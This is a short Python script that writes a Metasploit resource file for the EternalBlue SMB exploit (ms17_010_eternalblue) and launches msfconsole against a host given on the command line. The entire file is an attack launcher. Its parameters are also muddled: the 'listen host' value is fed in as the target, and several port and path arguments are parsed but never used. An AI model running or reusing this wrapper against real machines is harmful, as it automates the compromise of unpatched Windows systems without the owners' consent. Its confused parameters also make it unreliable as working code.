# -*- coding = utf-8 -*-
# @Time:2022/6/16 下午 5:19
# @Author:CK
# @File:msf+os+argparse
# @Software:PyCharm
import os
import argparse


def msf():
    with open("msf.rc", 'w') as file:
        file.write("use exploit/windows/smb/ms17_010_eternalblue\n")
        file.write("set rhosts " + str(lhost) + '\n')
        file.write("run\n")
    os.system('msfconsole -r msf.rc')


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='fishing here')
    parser.add_argument('-1', required=True, help='listen host', dest='lhost')
    parser.add_argument('-p', required=True, help='exploit listening port', dest='lport')
    parser.add_argument('-t', required=True, help='redirect to this hackingfile', dest='path')
    parser.add_argument('-r', required=True, help='redirecting listen port', dest='rport')
    args = parser.parse_args()
    print(args)
    rport = args.rport
    lport = args.lport
    path = args.path
    lhost = args.lhost

    msf()
